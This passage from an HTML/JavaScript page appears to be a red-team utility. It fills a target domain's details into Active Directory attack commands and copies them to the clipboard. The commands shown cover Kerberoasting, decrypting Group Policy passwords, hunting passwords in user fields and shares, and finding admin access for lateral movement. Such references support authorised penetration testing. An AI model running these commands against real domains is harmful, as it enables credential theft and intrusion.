        command: "GetUserSPNs.py -request -target-domain foreignforest.local {DOMAIN}/{USERNAME}:'{PASSWORD}'"
    },

    // Phase 12: Group Policy Attacks
    {
        phase: "Phase 12",
        title: "Decrypt GPP Password",
        description: "Decrypt Group Policy Preferences password",
        category: "GPO",
        requiresCreds: false,
        command: "gpp-decrypt 'ENCRYPTED_CPASSWORD'"
    },
    {
        phase: "Phase 12",
        title: "CrackMapExec - GPP Module",
        description: "Search for GPP passwords automatically",
        category: "GPO",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_autologin"
    },
    {
        phase: "Phase 12",
        title: "Enumerate GPOs",
        description: "List all Group Policy Objects (PowerView)",
        category: "GPO",
        requiresCreds: true,
        command: "Get-DomainGPO | Select-Object displayname"
    },

    // Phase 13: Miscellaneous
    {
        phase: "Phase 13",
        title: "Password in Description",
        description: "Find passwords in user descriptions (PowerView)",
        category: "Recon",
        requiresCreds: true,
        command: "Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.description -ne $null}"
    },
    {
        phase: "Phase 13",
        title: "PASSWD_NOTREQD Accounts",
        description: "Find accounts that don't require passwords",
        category: "Recon",
        requiresCreds: true,
        command: "Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol"
    },
    {
        phase: "Phase 13",
        title: "DNS Zone Dump",
        description: "Dump DNS zone records via LDAP",
        category: "DNS",
        requiresCreds: true,
        command: "adidnsdump -u {DOMAIN_SHORT}\\\\{USERNAME} ldap://{DC_IP}"
    },
    {
        phase: "Phase 13",
        title: "SYSVOL Scripts Enumeration",
        description: "List scripts in SYSVOL share",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "ls \\\\\\\\{DC_IP}\\\\SYSVOL\\\\{DOMAIN}\\\\scripts"
    },
    {
        phase: "Phase 13",
        title: "Find Domain Shares",
        description: "Discover all domain file shares (PowerView)",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "Find-DomainShare"
    },
    {
        phase: "Phase 13",
        title: "Find Interesting Files",
        description: "Search for sensitive files in shares (PowerView)",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "Find-InterestingDomainShareFile"
    },
    {
        phase: "Phase 13",
        title: "Snaffler - File Hunter",
        description: "Automated sensitive file discovery",
        category: "Share Enumeration",
        requiresCreds: true,
        command: ".\\Snaffler.exe -d {DOMAIN} -s -v data"
    },
    {
        phase: "Phase 13",
        title: "Find Local Admin Access",
        description: "Find machines where user has local admin (PowerView)",
        category: "Lateral Movement",
        requiresCreds: true,
        command: "Find-LocalAdminAccess"
    },
    {
        phase: "Phase 13",
        title: "Find User Sessions",
        description: "Locate where domain users are logged in (PowerView)",
        category: "Lateral Movement",
        requiresCreds: true,
        command: "Find-DomainUserLocation"
    },
];

// Global state
let config = {};
let filteredCommands = [...commandLibrary];

// Load configuration
function applyConfig() {
    config = {
        DC_NAME: document.getElementById('dcName').value.trim(),
        DC_IP: document.getElementById('dcIP').value.trim(),
        DOMAIN: document.getElementById('domain').value.trim(),
        DOMAIN_SHORT: document.getElementById('domainShort').value.trim(),
        ATTACKER_IP: document.getElementById('attackerIP').value.trim() || 'ATTACKER_IP',
        USERNAME: document.getElementById('username').value.trim() || 'USER',
        PASSWORD: document.getElementById('password').value.trim() || 'PASSWORD',
        NTHASH: document.getElementById('ntHash').value.trim() || 'NTHASH'
    };

    // Validate required fields
    if (!config.DC_NAME || !config.DC_IP || !config.DOMAIN || !config.DOMAIN_SHORT) {
        alert('Please fill in at least: DC Name, DC IP, Domain (FQDN), and Domain (Short)');
        return;
    }

    // Calculate BASE_DN
    config.BASE_DN = config.DOMAIN.split('.').map(part => `DC=${part}`).join(',');

    // Calculate network for nmap
    const ipParts = config.DC_IP.split('.');
    config.NETWORK = `${ipParts[0]}.${ipParts[1]}.${ipParts[2]}`;

    // Show target info
    displayTargetInfo();
    
    // Populate phase filter
    populatePhaseFilter();
    
    // Render commands
    renderCommands();
}

function clearConfig() {
    document.getElementById('dcName').value = '';
    document.getElementById('dcIP').value = '';
    document.getElementById('domain').value = '';
    document.getElementById('domainShort').value = '';
    document.getElementById('attackerIP').value = '';
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    document.getElementById('ntHash').value = '';
    
    config = {};
    document.getElementById('targetInfo').classList.remove('active');
    document.getElementById('commandContainer').innerHTML = '<div class="no-results">Configure your target to load commands</div>';
}

function exportConfig() {
    if (Object.keys(config).length === 0) {
        alert('Please configure your target first!');
        return;
    }

    const configText = `# Active Directory Target Configuration
# Generated: ${new Date().toLocaleString()}

DC_IP="${config.DC_IP}"
DC_NAME="${config.DC_NAME}"
DOMAIN="${config.DOMAIN}"
DOMAIN_SHORT="${config.DOMAIN_SHORT}"
BASE_DN="${config.BASE_DN}"
ATTACKER_IP="${config.ATTACKER_IP}"
USERNAME="${config.USERNAME}"
PASSWORD="${config.PASSWORD}"
NTHASH="${config.NTHASH}"
`;

    const blob = new Blob([configText], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ad_target_${config.DOMAIN_SHORT}.conf`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function displayTargetInfo() {
    const infoGrid = document.getElementById('infoGrid');
    infoGrid.innerHTML = '';

    const items = [
        { label: 'DC Name', value: config.DC_NAME },
        { label: 'DC IP', value: config.DC_IP },
        { label: 'Domain', value: config.DOMAIN },
        { label: 'Domain (Short)', value: config.DOMAIN_SHORT },
        { label: 'Base DN', value: config.BASE_DN },
        { label: 'Attacker IP', value: config.ATTACKER_IP },
        { label: 'Username', value: config.USERNAME },
        { label: 'Has Password', value: config.PASSWORD !== 'PASSWORD' ? 'Yes ‚úì' : 'No' }
    ];

    items.forEach(item => {
        const div = document.createElement('div');
        div.className = 'info-item';
        div.innerHTML = `
            <span class="info-label">${item.label}:</span>
            <span class="info-value">${item.value}</span>
        `;
        infoGrid.appendChild(div);
    });

    document.getElementById('targetInfo').classList.add('active');
}

function populatePhaseFilter() {
    const phaseFilter = document.getElementById('phaseFilter');
    const phases = [...new Set(commandLibrary.map(cmd => cmd.phase))].sort();
    
    phaseFilter.innerHTML = '<option value="">All Phases</option>';
    phases.forEach(phase => {
        const option = document.createElement('option');
        option.value = phase;
        option.textContent = phase;
        phaseFilter.appendChild(option);
    });
}

function applyFilters() {
    const searchTerm = document.getElementById('searchFilter').value.toLowerCase();
    const phaseFilter = document.getElementById('phaseFilter').value;
    const credFilter = document.getElementById('credFilter').value;

    filteredCommands = commandLibrary.filter(cmd => {
        // Search filter
        const matchesSearch = !searchTerm || 
            cmd.title.toLowerCase().includes(searchTerm) ||
            cmd.description.toLowerCase().includes(searchTerm) ||
            cmd.category.toLowerCase().includes(searchTerm) ||
            cmd.phase.toLowerCase().includes(searchTerm);

        // Phase filter
        const matchesPhase = !phaseFilter || cmd.phase === phaseFilter;

        // Credential filter
        let matchesCreds = true;
        if (credFilter === 'no-creds') {
            matchesCreds = !cmd.requiresCreds;
        } else if (credFilter === 'creds') {
            matchesCreds = cmd.requiresCreds;
        }

        return matchesSearch && matchesPhase && matchesCreds;
    });

    renderCommands();
}

function resetFilters() {
    document.getElementById('searchFilter').value = '';
    document.getElementById('phaseFilter').value = '';
    document.getElementById('credFilter').value = '';
    filteredCommands = [...commandLibrary];
    renderCommands();
}

function renderCommands() {
    const container = document.getElementById('commandContainer');
    
    if (Object.keys(config).length === 0) {
        container.innerHTML = '<div class="no-results">‚ö†Ô∏è Configure your target above to load commands</div>';
        updateStats();
        return;
    }

    if (filteredCommands.length === 0) {
        container.innerHTML = '<div class="no-results">No commands match your filters</div>';
        updateStats();
        return;
    }

    container.innerHTML = '';

    filteredCommands.forEach((cmd, idx) => {
        const card = document.createElement('div');
        card.className = 'command-card';
        card.dataset.index = idx;

        // Replace placeholders in command
        let processedCommand = cmd.command;
        Object.keys(config).forEach(key => {
            const regex = new RegExp(`\\{${key}\\}`, 'g');
            processedCommand = processedCommand.replace(regex, config[key]);
        });

        // Determine credential requirement display
        let credClass = 'both';
        let credText = 'Optional Credentials';
        if (cmd.requiresCreds) {
            credClass = 'requires-creds';
            credText = 'Requires Credentials';
        } else if (cmd.command.includes('{USERNAME}') || cmd.command.includes('{PASSWORD}')) {
            credClass = 'both';
            credText = 'Optional Credentials';
        } else {
            credClass = 'no-creds';
            credText = 'No Credentials Needed';
        }

        card.innerHTML = `
            <div class="card-header">
                <div class="card-title">${cmd.title}</div>
                <div class="card-phase">${cmd.phase}</div>
            </div>
            <div class="card-meta">
                <span class="meta-tag">üìÇ ${cmd.category}</span>
                <span class="meta-tag legend-box ${credClass}" style="padding: 5px 12px;">${credText}</span>
            </div>
            <div class="card-description">${cmd.description}</div>
            <div class="command-box">
                <div class="command-text">${escapeHtml(processedCommand)}</div>
            </div>
            <button class="copy-btn" onclick="copyCommand(${idx})">
                üìã Copy to Clipboard
            </button>
        `;

        container.appendChild(card);
    });

    updateStats();
}

function copyCommand(idx) {
    const cmd = filteredCommands[idx];
    let processedCommand = cmd.command;
    
    // Replace all placeholders
    Object.keys(config).forEach(key => {
        const regex = new RegExp(`\\{${key}\\}`, 'g');
        processedCommand = processedCommand.replace(regex, config[key]);
    });

    // Copy to clipboard
    navigator.clipboard.writeText(processedCommand).then(() => {
        // Show copy indicator
        const indicator = document.getElementById('copyIndicator');
        indicator.classList.add('show');
        
        // Flash the card
        const cards = document.querySelectorAll('.command-card');
        if (cards[idx]) {
            cards[idx].classList.add('copied');
            setTimeout(() => {
                cards[idx].classList.remove('copied');
            }, 500);
        }

        // Hide indicator
        setTimeout(() => {
            indicator.classList.remove('show');
        }, 1500);
    }).catch(err => {
        alert('Failed to copy command: ' + err);
    });
}

function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

function updateStats() {
    document.getElementById('totalCommands').textContent = commandLibrary.length;
    
    const phases = new Set(commandLibrary.map(cmd => cmd.phase));
    document.getElementById('totalPhases').textContent = phases.size;
    
    document.getElementById('availableCommands').textContent = filteredCommands.length;
}

// Initialize on load
window.onload = function() {
    updateStats();
    populatePhaseFilter();
};
</script>

</body>
</html>
